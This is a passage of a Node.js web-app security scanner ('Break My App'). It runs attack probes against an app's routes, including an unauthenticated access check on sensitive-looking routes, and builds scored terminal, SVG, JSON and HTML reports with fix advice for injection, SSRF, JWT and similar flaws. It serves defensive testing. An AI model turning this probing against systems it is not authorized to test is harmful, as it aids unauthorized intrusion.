  'ssrf': ['The server fetched an attacker-supplied URL and reached internal/cloud-metadata endpoints — often leads to credential theft.', 'Allow-list the hosts your server may fetch; block private/link-local IP ranges and metadata IPs; resolve-then-validate before connecting.'],
  'xxe': ['An XML parser resolved external entities and read local files (XXE).', 'Disable DTDs/external entities in your XML parser (e.g. noent off, FEATURE_SECURE_PROCESSING on).'],
  'traversal': ['A path/filename parameter reached the filesystem and returned OS files (LFI).', 'Never pass user input to fs paths. Resolve against a fixed base dir and reject anything that escapes it; use an allow-list of ids.'],
  'crlf-injection': ['A newline in user input created a new HTTP response header (response splitting).', 'Strip CR/LF from anything you put in headers; use framework header/redirect APIs, never string concat.'],
  'open-redirect': ['A redirect parameter sent the browser to an attacker-controlled host — great for phishing.', 'Redirect only to a relative path or an allow-list of hosts; reject //, \\ and absolute off-site URLs.'],
  'host-header': ['The Host header was trusted and reflected — enables cache poisoning and poisoned password-reset links.', 'Validate Host against an allow-list; build absolute URLs from a configured base URL, not the request Host.'],
  'mass-assignment': ['Extra privileged fields (role/isAdmin) in the body were accepted — users can escalate their own privileges.', 'Bind only an explicit allow-list of fields to your model; never spread the raw request body into a record.'],
  'bola': ['Changing an object id returned a different record for the same session — broken object-level authorization (IDOR).', 'On every object fetch, check the object belongs to the caller, not just that the caller is logged in.'],
  'jwt-alg-none': ['The server accepted a forged JWT (alg:none or stripped signature) — total auth bypass.', 'Pin the expected algorithm and verify the signature with your secret/public key; reject alg:none.'],
  'sensitive-file': ['A config/VCS/secret file is served over HTTP.', 'Block dotfiles and build/VCS paths at the web server; never deploy .env/.git into the web root.'],
  'secret-leak': ['A credential/API key appears in a response.', 'Remove secrets from client-visible responses and rotate the exposed key immediately.'],
  'graphql-introspection': ['The full GraphQL schema is queryable in production — a free map of your API for attackers.', 'Disable introspection in production and enforce query depth/complexity limits.'],
  'debug-endpoint': ['A debug/management endpoint is reachable and leaks config, env or internals.', 'Disable or authenticate management endpoints (actuator, phpinfo, server-status, metrics) in production.'],
  'security-headers': ['A baseline security header is missing.', 'Add X-Content-Type-Options: nosniff and (on HTTPS) Strict-Transport-Security; a helmet-style middleware sets these.'],
  'clickjacking': ['The page can be framed by any site — clickjacking risk.', 'Set X-Frame-Options: DENY or CSP frame-ancestors \'none\'.'],
  'cors': ['CORS is configured too permissively.', 'Reflect only an allow-list of origins; never combine a reflected origin with Allow-Credentials: true.'],
  'insecure-cookie': ['A cookie is missing HttpOnly/Secure/SameSite.', 'Set HttpOnly + Secure + SameSite=Lax/Strict on session cookies.'],
  'no-rate-limit': ['A sensitive endpoint accepted a burst with no throttling — brute force is unimpeded.', 'Add rate limiting / lockout on auth and other sensitive routes (express-rate-limit, proxy limits).'],
  'verbose-headers': ['The server advertises its framework and version in headers.', 'Strip them: app.disable("x-powered-by"); override/remove the Server header at the proxy.'],
  'xss': ['User input was reflected into an HTML page unescaped — an attacker runs JavaScript in your users\' browsers (session theft, account takeover).', 'Context-escape all output (HTML-encode by default), set a strict Content-Security-Policy, and never build HTML by concatenating input.'],
  'nosql-injection': ['A NoSQL operator object ({"$ne":null}) was accepted as a credential and bypassed login.', 'Cast credentials to strings before querying, reject non-string / $-prefixed inputs, and use parameterized queries.'],
};

// ---------- missing-authz probe ----------
// Only user-scoped / sensitive-looking routes count: a public route legitimately serves the
// same thing to everyone, so comparing authed vs anon there just produces false positives.
const SENSITIVE_RE = /(account|\/me\b|profile|admin|settings|\/orders?\/|billing|dashboard|private|\/users?\/\d|secret|token)/i;
async function infiltrate(routes, log) {
  for (const route of routes) {
    if (!SENSITIVE_RE.test(route)) continue;
    const n = await hit(route, { noauth: true });
    if (n.ok && n.status < 300 && n.text && n.text.length > 2) log({ severity: 'crit', cat: 'missing-authz', title: 'sensitive route served with NO credentials', route, detail: 'this route looks user-scoped but returns data without a session' });
  }
}

// ---------- presentation ----------
const sevColor = { crit: C.r, high: C.y, med: C.b };
const sevSvg = { crit: '#ff6b6b', high: '#ffa657', med: '#79c0ff' };
const sevLabel = { crit: 'CRITICAL', high: 'HIGH', med: 'MEDIUM' };
const sevOrder = { crit: 0, high: 1, med: 2 };
const SPIN = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
let spinI = 0, statusOn = false, fired = 0, curAtk = '';
function drawStatus() { if (!TTY) return; process.stdout.write(`\r\x1b[K${C.d}${SPIN[spinI = (spinI + 1) % SPIN.length]} ${fired} attacks fired · ${curAtk}${C.x}`); statusOn = true; }
function clearStatus() { if (TTY && statusOn) { process.stdout.write('\r\x1b[K'); statusOn = false; } }

const cast = [];
const stripAnsi = (s) => s.replace(/\x1b\[[0-9;]*m/g, '');
function say(s, castColor) { clearStatus(); console.log(s); if (opt('--cast') && castColor) cast.push({ text: stripAnsi(s), color: castColor }); }

function buildCast(score, grade, color) {
  const rows = cast.slice(-30);
  rows.unshift({ text: `$ npx breakmyapp ${base.host}`, color: '#8b949e' });
  const fs = 13.5, cw = 7.9, padL = 18, top = 52, rh = 22;
  const esc = (t) => t.replace(/[&<>]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[c])).slice(0, 118);
  const maxLen = Math.max(34, ...rows.map((r) => r.text.length));
  const W = Math.min(1000, Math.round(maxLen * cw + padL * 2));
  const H = top + rows.length * rh + 20;
  const step = 0.15;
  const endT = (rows.length * step).toFixed(2);
  const cycle = (rows.length * step + 3.4).toFixed(2);
  let body = '';
  rows.forEach((r, i) => {
    const t = (i * step).toFixed(2), y = top + i * rh;
    if (r.color === sevSvg.crit) body += `<rect x="${padL - 6}" y="${y - 14}" width="${W - (padL - 6) * 2}" height="${rh - 4}" rx="3" fill="#ff6b6b" opacity="0"><set attributeName="opacity" to="0" begin="k.begin"/><set attributeName="opacity" to="0.08" begin="k.begin+${t}s"/></rect>`;
    body += `<g opacity="0"><set attributeName="opacity" to="0" begin="k.begin"/><set attributeName="opacity" to="1" begin="k.begin+${t}s"/><text x="${padL}" y="${y}" fill="${r.color}" font-family="ui-monospace,SFMono-Regular,Menlo,Consolas,monospace" font-size="${fs}">${esc(r.text)}</text></g>`;
  });
  // header score pill, revealed at the end
  const pillW = 96, pillX = W - pillW - 12;
  const pill = `<g opacity="0"><set attributeName="opacity" to="0" begin="k.begin"/><set attributeName="opacity" to="1" begin="k.begin+${endT}s"/><rect x="${pillX}" y="6" width="${pillW}" height="18" rx="9" fill="${color}"/><text x="${pillX + pillW / 2}" y="19" text-anchor="middle" fill="#ffffff" font-family="ui-monospace,monospace" font-size="12" font-weight="bold">${score}/100 ${grade}</text></g>`;
  const cursorY = top + rows.length * rh;
  return `<svg xmlns="http://www.w3.org/2000/svg" width="${W}" height="${H}" viewBox="0 0 ${W} ${H}" role="img" aria-label="Break My App run — score ${score}/100 ${grade}">
<rect width="${W}" height="${H}" rx="10" fill="#0d1117"/><rect width="${W}" height="30" rx="10" fill="#161b22"/><rect y="22" width="${W}" height="8" fill="#161b22"/>
<circle cx="18" cy="15" r="5" fill="#ff5f56"/><circle cx="36" cy="15" r="5" fill="#ffbd2e"/><circle cx="54" cy="15" r="5" fill="#27c93f"/>
<text x="72" y="19" fill="#8b949e" font-family="ui-monospace,monospace" font-size="12">breakmyapp — ${esc(base.host)}</text>
${pill}
<rect width="0" height="0"><animate id="k" attributeName="width" from="0" to="0" begin="0s;k.end" dur="${cycle}s"/></rect>
${body}
<rect x="${padL}" y="${cursorY - 12}" width="9" height="15" fill="#7ee787"><animate attributeName="opacity" values="1;0;1" dur="1s" repeatCount="indefinite"/></rect>
</svg>`;
}

function buildReport(profile, score, grade, color, counts, findings, roster, died) {
  const esc = (t) => String(t == null ? '' : t).replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
  const sevName = { crit: 'Critical', high: 'High', med: 'Medium' };
  const byCat = new Map();
  for (const f of findings) { if (!byCat.has(f.cat)) byCat.set(f.cat, []); byCat.get(f.cat).push(f); }
  const cats = [...byCat.entries()].sort((a, b) => sevOrder[a[1][0].severity] - sevOrder[b[1][0].severity] || b[1].length - a[1].length);

  const rosterHtml = roster.map((a) => {
    const found = findings.filter((f) => f.attacker === a.name).length;
    const st = !a.ran ? ['skip', 'skipped'] : found ? ['bad', found + ' found'] : ['ok', 'clean'];
    return `<div class="atk ${st[0]}"><span class="ai">${a.icon}</span><span class="an">${esc(a.name)}</span><span class="as">${st[1]}</span></div>`;
  }).join('');

  const catHtml = cats.map(([cat, fs]) => {
    const sv = fs.slice().sort((a, b) => sevOrder[a.severity] - sevOrder[b.severity])[0].severity;
    const [why, how] = FIXES[cat] || ['', ''];
    const items = fs.map((f) => `<li><span class="rt">${esc(f.route)}</span> ${esc(f.title)}${f.detail ? `<div class="dt">${esc(f.detail)}</div>` : ''}</li>`).join('');
    return `<section class="cat ${sv}" data-sev="${sv}"><button class="chd" onclick="this.parentNode.classList.toggle('open')"><span class="dot"></span><span class="cn">${esc(cat)}</span><span class="cc">${fs.length}</span><span class="cv">${sevName[sv]}</span><span class="cx">&#9656;</span></button><div class="cbd">${why ? `<p class="why"><b>Why it matters.</b> ${esc(why)}</p>` : ''}${how ? `<p class="how"><b>How to fix.</b> ${esc(how)}</p>` : ''}<ul class="items">${items}</ul></div></section>`;
  }).join('');

  const r = 52, cc = 2 * Math.PI * r, off = cc * (1 - score / 100);
  const ring = `<svg width="140" height="140" viewBox="0 0 140 140"><circle cx="70" cy="70" r="${r}" fill="none" stroke="#2a2250" stroke-width="12"/><circle cx="70" cy="70" r="${r}" fill="none" stroke="${color}" stroke-width="12" stroke-linecap="round" stroke-dasharray="${cc.toFixed(1)}" stroke-dashoffset="${off.toFixed(1)}" transform="rotate(-90 70 70)"/><text x="70" y="66" text-anchor="middle" fill="#f5f3ff" font-size="34" font-weight="800">${score}</text><text x="70" y="90" text-anchor="middle" fill="#a99fd6" font-size="13">/ 100 &#183; ${grade}</text></svg>`;

  const css = `:root{--bg:#0e0820;--panel:#160f31;--line:#2a2250;--ink:#f5f3ff;--mut:#a99fd6;--gold:#f5c451;--crit:#ff6b6b;--high:#ffa657;--med:#79c0ff}*{box-sizing:border-box}body{margin:0;background:radial-gradient(1200px 600px at 50% -200px,#241653,#0e0820);color:var(--ink);font-family:'Segoe UI',system-ui,-apple-system,Helvetica,Arial,sans-serif;line-height:1.5}.wrap{max-width:960px;margin:0 auto;padding:28px 20px 80px}.top{display:flex;gap:24px;align-items:center;background:linear-gradient(135deg,#1a1033,#0e0820);border:1px solid var(--line);border-radius:20px;padding:24px}h1{margin:0 0 4px;font-size:24px;letter-spacing:.5px}h1 .g{color:var(--gold)}.sub{color:var(--mut);font-size:14px;margin:0}.pills{display:flex;gap:10px;margin:14px 0 0;flex-wrap:wrap}.pill{font-size:12.5px;padding:5px 11px;border-radius:999px;border:1px solid var(--line);background:#160f31;color:var(--mut)}.pill b{color:var(--ink)}.counts{display:flex;gap:10px;margin:22px 0 8px}.cbox{flex:1;border:1px solid var(--line);border-radius:14px;padding:14px 16px;background:var(--panel)}.cbox .n{font-size:28px;font-weight:800}.cbox.crit .n{color:var(--crit)}.cbox.high .n{color:var(--high)}.cbox.med .n{color:var(--med)}.cbox .l{color:var(--mut);font-size:13px}h2{font-size:15px;letter-spacing:.4px;color:var(--mut);text-transform:uppercase;margin:30px 0 12px}.roster{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:8px}.atk{display:flex;align-items:center;gap:9px;border:1px solid var(--line);border-radius:12px;padding:9px 12px;background:var(--panel);font-size:13.5px}.atk .ai{font-size:16px}.atk .an{flex:1}.atk .as{font-size:11.5px;font-weight:700;padding:2px 9px;border-radius:999px}.atk.ok .as{background:#143a24;color:#4ade80}.atk.ok{opacity:.72}.atk.bad .as{background:#3a1414;color:#ff8a8a}.atk.skip .as{background:#241f3d;color:#8a80ad}.atk.skip{opacity:.5}.filter{display:flex;gap:8px;margin:0 0 14px;flex-wrap:wrap}.fb{cursor:pointer;border:1px solid var(--line);background:var(--panel);color:var(--mut);border-radius:999px;padding:6px 14px;font-size:13px}.fb.on{background:var(--gold);color:#241406;border-color:var(--gold);font-weight:700}.cat{border:1px solid var(--line);border-radius:14px;margin:0 0 10px;overflow:hidden;background:var(--panel)}.cat .chd{width:100%;display:flex;align-items:center;gap:12px;background:none;border:0;color:var(--ink);padding:14px 16px;cursor:pointer;font-size:15px;text-align:left}.cat .dot{width:10px;height:10px;border-radius:50%;flex:none}.cat.crit .dot{background:var(--crit)}.cat.high .dot{background:var(--high)}.cat.med .dot{background:var(--med)}.cat .cn{font-weight:700;flex:1;font-family:ui-monospace,monospace}.cat .cc{background:#241f3d;border-radius:999px;padding:2px 10px;font-size:12.5px;color:var(--mut)}.cat .cv{font-size:12px;color:var(--mut)}.cat .cx{transition:transform .2s;color:var(--mut)}.cat.open .cx{transform:rotate(90deg)}.cat .cbd{display:none;padding:0 16px 16px;border-top:1px solid var(--line)}.cat.open .cbd{display:block}.why{color:var(--mut);font-size:14px}.how{color:#d7f5e1;font-size:14px;background:#10281b;border:1px solid #1d4d33;border-radius:10px;padding:10px 12px}.why b,.how b{color:var(--ink)}.items{list-style:none;margin:10px 0 0;padding:0}.items li{padding:9px 0;border-top:1px solid var(--line);font-size:14px}.items .rt{font-family:ui-monospace,monospace;color:var(--gold);margin-right:8px}.items .dt{color:var(--mut);font-size:12.5px;margin-top:3px;font-family:ui-monospace,monospace;word-break:break-word}.foot{color:#6b6390;font-size:12px;margin-top:30px;text-align:center}`;

  return `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Break My App &#8212; ${esc(profile.host)}</title><style>${css}</style></head><body><div class="wrap">
<div class="top"><div>${ring}</div><div class="meta"><h1>&#128165; Break My <span class="g">App</span></h1><p class="sub">Security report &#183; ${esc(new Date().toLocaleString())}</p><div class="pills"><span class="pill">&#127919; <b>${esc(profile.origin)}</b></span>${profile.title ? `<span class="pill">&#128196; ${esc(profile.title)}</span>` : ''}<span class="pill">server: <b>${esc(profile.server)}</b></span><span class="pill">${roster.length} attackers &#183; ${findings.length} findings</span>${died ? '<span class="pill" style="color:#ff8a8a">server crashed mid-scan</span>' : ''}</div></div></div>
<div class="counts"><div class="cbox crit"><div class="n">${counts.crit}</div><div class="l">Critical</div></div><div class="cbox high"><div class="n">${counts.high}</div><div class="l">High</div></div><div class="cbox med"><div class="n">${counts.med}</div><div class="l">Medium</div></div></div>
<h2>Attack squad</h2><div class="roster">${rosterHtml}</div>
<h2>Findings &amp; how to fix them</h2><div class="filter"><button class="fb on" data-f="all">All</button><button class="fb" data-f="crit">Critical</button><button class="fb" data-f="high">High</button><button class="fb" data-f="med">Medium</button></div><div id="cats">${catHtml || '<p class="sub">Nothing broke. &#127881;</p>'}</div>
<p class="foot">Generated by Break My App &#183; a first-pass QA aid, not a full security audit &#183; test only apps you own or are authorized to test.</p>
</div><script>document.querySelectorAll('.fb').forEach(function(b){b.onclick=function(){document.querySelectorAll('.fb').forEach(function(x){x.classList.remove('on')});b.classList.add('on');var f=b.dataset.f;document.querySelectorAll('.cat').forEach(function(c){c.style.display=(f==='all'||c.dataset.sev===f)?'':'none'})}});var first=document.querySelector('.cat');if(first)first.classList.add('open');</script></body></html>`;
}

// ---------- main ----------
(async () => {
  say(`\n${C.B}💥 BREAK MY APP${C.x} ${C.d}→ ${base.origin}${C.x}\n`, '#c9d1d9');
  if (!(await alive())) { console.error(`${C.r}Cannot reach ${base.origin}. Is your app running?${C.x}`); process.exit(1); }

  if (opt('--login-url') || hasAuth()) {
    const res = await login();
    if (res.did && !res.ok) console.error(`${C.r}Auth setup failed: ${res.why}${C.x}  (continuing unauthenticated)`);
    else if (hasAuth()) say(`${C.g}🔑 authenticated${C.x} ${C.d}(${AUTH.headers['authorization'] ? 'bearer token' : 'session cookie'})${C.x}`, '#7ee787');
  }

  const squad = attackers.filter((a) => !a.when || a.when()).length + (hasAuth() ? 1 : 0);
  process.stdout.write(`${C.d}scouting routes…${C.x} `);
  const routes = await discover();
  say(`${routes.length} routes · ${squad} attackers ready\n`, '#8b949e');
  console.log(`${C.d}${routes.join('  ')}${C.x}\n`);

  const home0 = await hit('/');
  const profile = { host: base.host, origin: base.origin, server: (home0.ok && (hget(home0, 'x-powered-by') || hget(home0, 'server'))) || 'unknown', title: (home0.ok && (home0.text.match(/<title>([^<]{1,80})<\/title>/i) || [])[1]) || '' };

  const findings = [];
  const seen = new Set();
  const ranNames = new Set();
  let died = false;
  let castFind = 0;
  const mkLog = (atk) => (f) => {
    const key = `${f.cat}|${f.route}|${f.title}`;
    if (seen.has(key)) return;
    seen.add(key);
    findings.push({ ...f, attacker: atk });
    clearStatus();
    console.log(`   ${sevColor[f.severity]}✖ ${sevLabel[f.severity].padEnd(8)}${C.x} ${f.route}  ${f.title}`);
    if (opt('--cast') && castFind < 20) { cast.push({ text: `  ✖ ${sevLabel[f.severity].padEnd(8)} ${f.route}  ${f.title}`.slice(0, 116), color: sevSvg[f.severity] }); castFind++; }
    if (TTY) drawStatus();
  };

  for (const atk of attackers) {
    if (atk.when && !atk.when()) continue;
    curAtk = atk.name;
    ranNames.add(atk.name);
    say(`${atk.icon}  ${C.B}${atk.name}${C.x}`, '#c9d1d9');
    if (atk.scope === 'host') { await atk.run(routes, mkLog(atk.name)); if (TTY) drawStatus(); }
    else {
      for (const route of routes) {
        fired++; if (TTY) drawStatus();
        await atk.run(route, mkLog(atk.name));
        await sleep(DELAY);
        if (!(await alive())) { mkLog(atk.name)({ severity: 'crit', cat: 'crash', title: 'server stopped responding entirely', route, detail: `after ${atk.name}` }); died = true; break; }
      }
    }
    clearStatus();
    if (died) break;
  }

  if (!died && hasAuth()) { ranNames.add('The Infiltrator'); say(`🕵️  ${C.B}The Infiltrator${C.x}`, '#c9d1d9'); await infiltrate(routes, mkLog('The Infiltrator')); clearStatus(); }

  // ---------- score ----------
  const counts = { crit: 0, high: 0, med: 0 };
  findings.forEach((f) => counts[f.severity]++);
  let score = Math.round(100 * Math.pow(0.95, counts.crit) * Math.pow(0.98, counts.high) * Math.pow(0.995, counts.med));
  if (died) score = Math.min(score, 25);
  const grade = died ? 'F' : score >= 90 ? 'A' : score >= 75 ? 'B' : score >= 60 ? 'C' : score >= 40 ? 'D' : 'F';
  const color = { A: '#2ea44f', B: '#7cb342', C: '#dfb317', D: '#fe7d37', F: '#e05d44' }[grade];

  say('\n' + '─'.repeat(62), '#484f58');
  if (TTY) { process.stdout.write(`${C.B}Survival score: ${C.x}`); for (let s = 0; s <= score; s += Math.max(1, Math.round(score / 20))) { process.stdout.write(`\r\x1b[K${C.B}Survival score: ${s}/100${C.x}`); await sleep(16); } process.stdout.write('\r\x1b[K'); }
  say(`${C.B}Survival score: ${score}/100  (grade ${grade})${C.x}${died ? `  ${C.r}server died${C.x}` : ''}`, grade === 'A' || grade === 'B' ? '#7ee787' : '#ffa657');
  say(`${C.r}${counts.crit} critical${C.x} · ${C.y}${counts.high} high${C.x} · ${C.b}${counts.med} medium${C.x}  ${C.d}${findings.length} findings${C.x}`, '#c9d1d9');

  // ---------- explain & fix ----------
  if (findings.length && !flag('--no-fixes')) {
    const byCat = new Map();
    for (const f of findings) { if (!byCat.has(f.cat)) byCat.set(f.cat, []); byCat.get(f.cat).push(f); }
    const cats = [...byCat.entries()].sort((a, b) => sevOrder[a[1][0].severity] - sevOrder[b[1][0].severity]);
    console.log(`\n${C.B}What broke, why it matters, and how to fix it${C.x}`);
    for (const [cat, fs] of cats) {
      const [why, how] = FIXES[cat] || ['', ''];
      const sv = fs.slice().sort((a, b) => sevOrder[a.severity] - sevOrder[b.severity])[0].severity;
      const rs = [...new Set(fs.map((f) => f.route))];
      console.log(`\n${sevColor[sv]}● ${cat}${C.x} ${C.d}(${fs.length}× on ${rs.slice(0, 5).join(', ')}${rs.length > 5 ? '…' : ''})${C.x}`);
      if (why) console.log(`   ${C.d}why:${C.x} ${why}`);
      if (how) console.log(`   ${C.g}fix:${C.x} ${how}`);
      console.log(`   ${C.d}example: ${fs[0].route} — ${fs[0].title}${C.x}`);
    }
  } else if (!findings.length) console.log(`\n${C.g}Nothing broke. Suspiciously good — or well built.${C.x}`);

  // ---------- badge ----------
  const lbl = 'survived break-my-app', val = `${score}/100 ${grade}`;
  const lw = lbl.length * 6.2 + 14, vw = val.length * 6.6 + 14, w = lw + vw;
  writeFileSync(opt('--badge', 'breakmyapp-badge.svg'), `<svg xmlns="http://www.w3.org/2000/svg" width="${w}" height="20" role="img" aria-label="${lbl}: ${val}"><linearGradient id="s" x2="0" y2="100%"><stop offset="0" stop-color="#bbb" stop-opacity=".1"/><stop offset="1" stop-opacity=".1"/></linearGradient><clipPath id="r"><rect width="${w}" height="20" rx="3"/></clipPath><g clip-path="url(#r)"><rect width="${lw}" height="20" fill="#555"/><rect x="${lw}" width="${vw}" height="20" fill="${color}"/><rect width="${w}" height="20" fill="url(#s)"/></g><g fill="#fff" text-anchor="middle" font-family="Verdana,sans-serif" font-size="11"><text x="${lw / 2}" y="14">${lbl}</text><text x="${lw + vw / 2}" y="14">${val}</text></g></svg>`);
  console.log(`\n${C.d}badge → ${opt('--badge', 'breakmyapp-badge.svg')}${C.x}`);

  if (opt('--cast')) { writeFileSync(opt('--cast'), buildCast(score, grade, color)); console.log(`${C.d}cast  → ${opt('--cast')} (animated, embeds in a README)${C.x}`); }
  if (opt('--json')) { const enriched = findings.map((f) => ({ ...f, why: FIXES[f.cat]?.[0], fix: FIXES[f.cat]?.[1] })); writeFileSync(opt('--json'), JSON.stringify({ target: base.origin, score, grade, died, counts, findings: enriched }, null, 2)); console.log(`${C.d}json  → ${opt('--json')}${C.x}`); }
  if (opt('--report')) {
    const roster = attackers.map((a) => ({ name: a.name, icon: a.icon, ran: ranNames.has(a.name) }));
    if (hasAuth()) roster.push({ name: 'The Infiltrator', icon: '🕵️', ran: ranNames.has('The Infiltrator') });
    writeFileSync(opt('--report'), buildReport(profile, score, grade, color, counts, findings, roster, died));
    console.log(`${C.g}report→ ${opt('--report')}${C.x}${flag('--no-open') ? '' : `  ${C.d}(opening…)${C.x}`}`);
    if (!flag('--no-open')) openInBrowser(opt('--report'));
  }

  process.exit(died || counts.crit ? 1 : 0);
})();
